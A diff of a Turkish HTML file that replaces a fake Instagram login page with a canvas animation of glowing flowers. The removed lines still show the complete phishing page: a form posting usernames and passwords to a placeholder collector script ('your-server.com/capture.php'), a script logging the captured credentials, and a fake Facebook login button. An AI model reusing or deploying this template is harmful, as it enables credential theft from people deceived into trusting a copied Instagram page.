@@ -1,60 +1,109 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram - Giriş Yap</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px 40px 20px; text-align: center; }
-        .logo { font-size: 32px; font-weight: 600; color: #262626; margin-bottom: 30px; font-family: 'Billabong', cursive; }
-        .login-form { margin-bottom: 20px; }
-        .input-group { margin-bottom: 10px; }
-        input[type="text"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 14px; text-align: left; }
-        input[type="text"]:focus, input[type="password"]:focus { border-color: #0095f6; outline: none; background: white; }
-        .login-btn { width: 100%; background: #0095f6; color: white; border: none; padding: 8px; border-radius: 5px; font-weight: 600; cursor: pointer; margin-top: 10px; }
-        .login-btn:hover { background: #1877f2; }
-        .forgot { font-size: 12px; color: #00376b; text-decoration: none; margin-top: 15px; display: inline-block; }
-        .divider { margin: 20px 0; border-top: 1px solid #dbdbdb; position: relative; }
-        .divider span { background: white; padding: 0 15px; color: #8e8e8e; font-size: 13px; position: absolute; top: -7px; left: 50%; transform: translateX(-50%); }
-        .signup-link { color: #0095f6; text-decoration: none; font-weight: 600; }
-        @media (max-width: 375px) { .container { width: 100%; margin: 0 20px; border: none; } }
-    </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Çiçek 🌸</title>
+<style>
+  html,body{
+    margin:0; padding:0;
+    width:100%; height:100%;
+    background:#050505;
+    overflow:hidden;
+  }
+  canvas{display:block;}
+  .text{
+    position:absolute;
+    bottom:40px;
+    width:100%;
+    text-align:center;
+    font-family: system-ui, sans-serif;
+    color:#eaeaea;
+    opacity:.8;
+    letter-spacing:1px;
+  }
+</style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">Instagram</div>
-        <form class="login-form" id="loginForm" method="POST" action="https://your-server.com/capture.php">
-            <div class="input-group">
-                <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
-            </div>
-            <div class="input-group">
-                <input type="password" name="password" placeholder="Şifre" required>
-            </div>
-            <button type="submit" class="login-btn">Giriş Yap</button>
-        </form>
-        <a href="#" class="forgot">Şifreni mi unuttun?</a>
-        <div class="divider"><span>veya</span></div>
-        <button class="login-btn" style="background: #efefef; color: #262626;">Facebook ile giriş yap</button>
-        <p style="font-size: 14px; margin-top: 20px; color: #8e8e8e;">Hesabın yok mu? <a href="#" class="signup-link">Kaydol</a></p>
-    </div>
+<canvas id="c"></canvas>
+<div class="text">Sen yazılımcısın 🌸</div>
 
-    <script>
-        // Form submit edildiğinde bilgileri yakala ve gönder
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            // Burada istersen client-side validation ekleyebilirsin
-            console.log('Bilgiler yakalandı:', {
-                username: document.querySelector('input[name="username"]').value,
-                password: document.querySelector('input[name="password"]').value
-            });
-        });
+<script>
+const canvas = document.getElementById("c");
+const ctx = canvas.getContext("2d");
+resize();
+window.addEventListener("resize", resize);
 
-        // Fake Facebook login redirect
-        document.querySelector('.login-btn[style*="background: #efefef"]').addEventListener('click', function() {
-            alert('Facebook ile giriş özelliği yakında aktif olacak.');
-        });
-    </script>
+function resize(){
+  canvas.width = innerWidth;
+  canvas.height = innerHeight;
+}
+
+let t = 0;
+
+function drawStem(x, h){
+  ctx.strokeStyle = "#1fd1a1";
+  ctx.lineWidth = 6;
+  ctx.beginPath();
+  ctx.moveTo(x, canvas.height);
+  ctx.lineTo(x, canvas.height - h);
+  ctx.stroke();
+}
+
+function drawFlower(x, y, r){
+  ctx.save();
+  ctx.translate(x,y);
+  for(let i=0;i<6;i++){
+    ctx.rotate(Math.PI/3);
+    ctx.fillStyle = "rgba(100,255,220,0.9)";
+    ctx.beginPath();
+    ctx.ellipse(0,-r,r*0.6,r*1.2,0,0,Math.PI*2);
+    ctx.fill();
+  }
+  ctx.fillStyle="#fff6a8";
+  ctx.beginPath();
+  ctx.arc(0,0,r*0.4,0,Math.PI*2);
+  ctx.fill();
+  ctx.restore();
+}
+
+function glow(x,y,r){
+  const g = ctx.createRadialGradient(x,y,0,x,y,r*4);
+  g.addColorStop(0,"rgba(120,255,220,.6)");
+  g.addColorStop(1,"rgba(0,0,0,0)");
+  ctx.fillStyle=g;
+  ctx.beginPath();
+  ctx.arc(x,y,r*4,0,Math.PI*2);
+  ctx.fill();
+}
+
+function animate(){
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+  t+=0.01;
+
+  const baseX = canvas.width/2;
+  const height = Math.min(canvas.height*0.5, t*120);
+
+  drawStem(baseX-80,height*0.9);
+  drawStem(baseX,height);
+  drawStem(baseX+80,height*0.85);
+
+  if(height>120){
+    drawFlower(baseX-80,canvas.height-height*0.9,22);
+    glow(baseX-80,canvas.height-height*0.9,22);
+  }
+  if(height>150){
+    drawFlower(baseX,canvas.height-height,26);
+    glow(baseX,canvas.height-height,26);
+  }
+  if(height>100){
+    drawFlower(baseX+80,canvas.height-height*0.85,20);
+    glow(baseX+80,canvas.height-height*0.85,20);
+  }
+
+  requestAnimationFrame(animate);
+}
+animate();
+</script>
 </body>
 </html>
